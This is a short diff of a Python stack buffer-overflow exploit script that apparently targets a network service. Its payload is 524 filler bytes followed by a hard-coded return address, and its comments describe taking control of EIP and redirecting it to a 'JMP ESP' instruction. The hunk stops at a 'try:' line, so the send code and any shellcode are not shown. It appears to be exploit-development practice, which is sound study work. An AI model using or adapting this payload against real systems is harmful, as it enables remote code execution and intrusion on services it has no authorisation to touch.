@@ -1,7 +1,9 @@
 import socket,sys
 
-
+#Identify the EIP control
 #payload = "A" * 524 + "B" * 4
+
+#Identify that the EIP call the 'JMP ESP's instruction address
 payload = "A" * 524 + "\xF3\x12\x17\x31"
 
 try: 
